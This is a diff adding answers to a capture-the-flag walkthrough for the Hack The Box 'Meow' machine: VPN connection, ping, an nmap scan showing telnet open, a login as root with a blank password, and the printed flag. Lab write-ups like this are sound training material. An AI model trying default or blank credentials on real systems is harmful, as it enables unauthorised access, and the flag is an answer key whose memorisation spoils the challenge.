@@ -31,8 +31,85 @@ This question refers to the [command line interface](https://en.wikipedia.org/wi
 >terminal
 
 ## What service do we use to form our VPN connection into HTB labs?
+
+Here we are being asked about the technology that allows us to reack and attack target Hack The Box machines. just like we saw in te guide, we'll be using 
+
+>OpenVPN
+
+to connect to the machines by running `sudo openvpn your-openvpn-file-here.ovpn`in the terminal.
+
 ## What tool do we use to test our connection to the target with an ICMP echo request?
+
+How do we know whether our machine is connected or not to the target machine? We can use an [ICMP](https://en.wikipedia.org/wiki/Internet_Control_Message_Protocol) echo request, also known as
+
+>ping
+
+to test our connection like this `ping target-ip-here`
+
 ## What is the name of the most common tool for finding open ports on a target?
+
+We are getting closer to the real stuff: according to the [Cyber Kill Chain](https://en.wikipedia.org/wiki/Cyber_kill_chain) the first step of any cyberattack (and therefore security test) is [Reconnaisance](https://en.wikipedia.org/wiki/Footprinting). [Network enumeration](https://en.wikipedia.org/wiki/Network_enumeration) plays one of the biggest roles in reconnaisance as it allows us to list most network services running on a remote machine. The most famous tool for network enumeration is
+
+>nmap
+
+we'll use it by running `nmap target-ip-here`
+
 ## What service do we identify on port 23/tcp during our scans?
+
+nmap will return:
+
+```
+Host is up (0.10s latency).
+Not shown: 999 closed tcp ports (reset)
+PORT   STATE SERVICE
+23/tcp open  telnet
+
+Nmap done: 1 IP address (1 host up) scanned in 2.66 seconds
+```
+
+This means that port 23 is open and running
+
+>telnet
+
+a remote administration tool, on its [default port](https://en.wikipedia.org/wiki/Telnet).
+
 ## What username is able to log into the target over telnet with a blank password?
+
+telnet's login syntax is straightforward: `telnet target-machine-ip-here 23`
+
+The login process now requires an username and a password:
+
+```
+Meow login: 
+Password: 
+```
+
+The challenge tells us there's an username that requires no password to log in. We'll try some default usernames: 
+
+```
+Meow login: admin
+Password: 
+login incorrect
+```
+
+```
+Meow login: root
+Password: 
+Welcome to Ubuntu 20.04.2 LTS (GNU/Linux 5.4.0-77-generic x86_64)
+```
+
+we got in, that means the username is
+
+>root
+
 ## Submit root flag
+
+The challenge now asks us to find a flag. We can list all files and directories in a [GNU/Linux](https://en.wikipedia.org/wiki/Linux) distro with [`ls`](https://www.man7.org/linux/man-pages/man1/ls.1.html). This will return
+
+```
+flag.txt  snap
+```
+
+we now have to read `flag.txt`. we can do that with [`cat`](https://man7.org/linux/man-pages/man1/cat.1.html) just like this: `cat flag.txt`. This will return:
+
+>b40abdfe23665f766f9c61ecba8a4c19
